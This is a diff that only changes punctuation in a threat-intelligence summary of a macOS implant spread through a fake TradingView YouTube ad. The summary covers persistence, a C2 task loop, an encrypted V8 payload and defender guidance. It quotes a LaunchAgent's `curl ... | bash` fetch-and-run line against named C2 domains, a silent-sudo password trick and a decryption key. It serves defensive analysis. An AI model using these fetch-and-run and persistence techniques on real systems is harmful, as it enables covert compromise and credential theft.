@@ -23,7 +23,7 @@
 - SafeDep
 
 ## Summary
-SafeDep (August 21, 2026) analyzed a macOS implant recovered from a compromised workstation whose infection began with a **paid Google video ad on YouTube** impersonating TradingView. The ad drove the victim to a fake `.pkg` installer; the malware is a full remote-controlled task runner, not a single-purpose stealer. It persists through a self-healing **LaunchAgent** watchdog, ships its main payload as an **AES-256-CBC–encrypted V8 code cache** that is decrypted only in memory, and bundles six native sidecar modules that provide keylogging, screen capture, keychain access, UI automation, and a local TLS-intercepting proxy backed by a rogue root CA in the System keychain.
+SafeDep (August 21, 2026) analyzed a macOS implant recovered from a compromised workstation whose infection began with a **paid Google video ad on YouTube** impersonating TradingView. The ad drove the victim to a fake `.pkg` installer; the malware is a full remote-controlled task runner, not a single-purpose stealer. It persists through a self-healing **LaunchAgent** watchdog, ships its main payload as an **AES-256-CBC-encrypted V8 code cache** that is decrypted only in memory, and bundles six native sidecar modules that provide keylogging, screen capture, keychain access, UI automation, and a local TLS-intercepting proxy backed by a rogue root CA in the System keychain.
 
 SafeDep's strongest public correlation is to the family tracked as **WEEVILPROXY** by WithSecure and **JSCEAL** by Check Point Research. SafeDep states explicitly that **this attribution is an inference, not a confirmed fact**: no public writeup names this macOS variant, its domains, or its persistence label. The family overlap is architectural (tRPC-over-WebSocket C2, bundled Node.js runtime, `0.<hash>.node` ncc-bundled modules, javascript-obfuscator, encrypted payload) and delivery-level (TradingView-impersonation malvertising, with the lure moving from Meta ads to YouTube video ads and from a signed MSI to a macOS-native `.pkg`).
 
@@ -36,21 +36,21 @@ SafeDep's strongest public correlation is to the family tracked as **WEEVILPROXY
 ## Delivery chain
 1. A paid Google video ad on YouTube (campaign ID `24022739496`, attacker-uploaded video `jfTdpYsvVz0`) advertises a "FREE 1 Year TradingView Subscription."
 2. The victim clicks through to `tradingview.15years-ultimate-utility.com`, which redirects to `15th-anniversary-free.com` (both carry `utm_campaign=o429-12.2&bid=MC`).
-3. The landing offers `latest_v19.398.7_setup.pkg` (2,081,181 bytes) — a minimal loader, far too small to hold the ~5.1 MB encrypted payload plus the ~40 MB Node.js runtime.
+3. The landing offers `latest_v19.398.7_setup.pkg` (2,081,181 bytes), a minimal loader, far too small to hold the ~5.1 MB encrypted payload plus the ~40 MB Node.js runtime.
 4. The installer runs inside the trusted `Installer.app` flow, prompts for an admin password through a native dialog, captures that password to `/Users/Shared/.passwd`, installs the LaunchAgent, and exits.
-5. Heavyweight components (runtime, facade app, payload) arrived later — staged over ~24 days through the C2 task channel, per on-disk timestamp inference.
+5. Heavyweight components (runtime, facade app, payload) arrived later, staged over ~24 days through the C2 task channel, per on-disk timestamp inference.
 
 ## Persistence and self-healing
-- The LaunchAgent is `~/Library/LaunchAgents/com.microsoft.service.systemhelperwatcher.v8mgfk.plist` — a label masquerading as a Microsoft service, unsigned, user-owned, whose only program is a two-domain `curl -fsSL --noproxy '*' … | bash` fallback against `velvetforge.net` (primary) and `cedarengine.com` (fallback).
+- The LaunchAgent is `~/Library/LaunchAgents/com.microsoft.service.systemhelperwatcher.v8mgfk.plist`, a label masquerading as a Microsoft service, unsigned, user-owned, whose only program is a two-domain `curl -fsSL --noproxy '*' … | bash` fallback against `velvetforge.net` (primary) and `cedarengine.com` (fallback).
 - Keys that make it resilient: `RunAtLoad=true`, `KeepAlive=true`, `ThrottleInterval=5`, `StartInterval=300`. Killing the payload re-arms the agent within five minutes; `launchctl disable` and process kills are defeated.
 - The registered executable is `/bin/bash`, so no attacker binary appears in the system launch-item inventory.
 - The stager installs a `trap` that re-enables, re-bootstraps, and kickstarts the LaunchAgent on any clean exit; `SIGTERM`, `SIGHUP`, and `SIGINT` are caught and converted to `exit 0`, which fires the trap. **Killing the process re-enables persistence.** Removal requires deleting the plist, the password cache, and the payload directory from a recovery environment, not the live session.
 
 ## Stager: task-dispatch loop
-- Both C2 domains are Cloudflare-fronted and serve the same 62-line shell script, mislabeled `application/pdf` — a gate the client also enforces, doubling as a kill switch (the operator can stop serving tasks by changing the response MIME type).
+- Both C2 domains are Cloudflare-fronted and serve the same 62-line shell script, mislabeled `application/pdf`, a gate the client also enforces, doubling as a kill switch (the operator can stop serving tasks by changing the response MIME type).
 - The script runs only when it detects launchd (`XPC_FLAGS=0x0` or `XPC_SERVICE_NAME` set, `TASK_LABEL` present), defeating manual analysis and sandboxes.
 - Core loop: `GET /script`, then `eval` the response body on a 3-second interval, with backoff after five empty replies.
-- Request headers: `X-Machine-Id` (lowercased UUID of the APFS Data volume — a stable per-host identifier) and `X-Token` (an HS256 JWT, `aud=coordination`, hard-coded in the script — it authenticates the campaign, not the host).
+- Request headers: `X-Machine-Id` (lowercased UUID of the APFS Data volume, a stable per-host identifier) and `X-Token` (an HS256 JWT, `aud=coordination`, hard-coded in the script, it authenticates the campaign, not the host).
 - The stager reads `/Users/Shared/.passwd` (world-readable) and pipes it into `sudo -S -p ''` for silent root.
 
 ## Payload: encrypted V8 bytecode in memory
@@ -58,7 +58,7 @@ SafeDep's strongest public correlation is to the family tracked as **WEEVILPROXY
 - Execution has three stages:
   1. `preload.js` (161 KB, javascript-obfuscator string array) decrypts an inline blob with AES-256-CBC using `process.env.KEY`, then `eval`s it.
   2. The stage-2 script installs a `Module._extensions['.js']` hook that, when Node loads `app.js`, reads the file, decrypts it (IV = first 16 bytes of the ciphertext), and loads the plaintext through `new vm.Script(placeholder, { cachedData })`.
-  3. The plaintext is **not** JavaScript source — it is an 18,646,360-byte V8 code cache (pre-compiled bytecode for ~7,544,235 bytes of source). The original source is not recoverable from disk; V8 skips parsing when it accepts the cache.
+  3. The plaintext is **not** JavaScript source, it is an 18,646,360-byte V8 code cache (pre-compiled bytecode for ~7,544,235 bytes of source). The original source is not recoverable from disk; V8 skips parsing when it accepts the cache.
 - SafeDep recovered the plaintext without executing attacker code by patching the single `eval(z)` call to dump the blob, hooking `crypto.createDecipheriv` and the `vm.Script` constructor, and replaying with the recovered key under Node.js v22.22.0.
 - Cipher parameters: AES-256-CBC, key `2e1ba69fb0124bbeb8b24fd8c719f9910401a3d0f1c18a99e9f5acdece54d8fa` (from `process.env.KEY`), IV = first 16 bytes of the ciphertext file.
 - String-mining the cache yielded 46,645 strings, almost all bundled dependencies (axios, undici, ws, a tRPC client, two WebAssembly builds of llhttp). The implant speaks tRPC over WebSocket to its C2, with full HTTP and SOCKS5 proxy support. Attacker strings are absent, consistent with runtime-decoded obfuscation.
@@ -82,7 +82,7 @@ The C++ module terminates TLS with leaf certificates minted under the rogue CA, 
 ## Defender guidance
 - Treat a paid ad on a major platform as a genuine initial-access vector: no exploit and no paste-into-Terminal trick were involved. The `Installer.app` admin prompt is a high-trust credential-collection point; one typed password gave the attacker persistent silent root through `/Users/Shared/.passwd`.
 - A legitimate signed Node.js binary plus `NODE_OPTIONS=--require` is enough to bypass Gatekeeper, notarization, and static AV; the payload never exists on disk as readable code.
-- The persistence design punishes partial remediation — killing the process or disabling the LaunchAgent re-arms it. Remediate from a recovery environment.
+- The persistence design punishes partial remediation, killing the process or disabling the LaunchAgent re-arms it. Remediate from a recovery environment.
 - A rogue root CA plus a local proxy turns one compromised Mac into a full TLS-interception point for every application that honors system proxy settings.
 
 ## Hunting on macOS
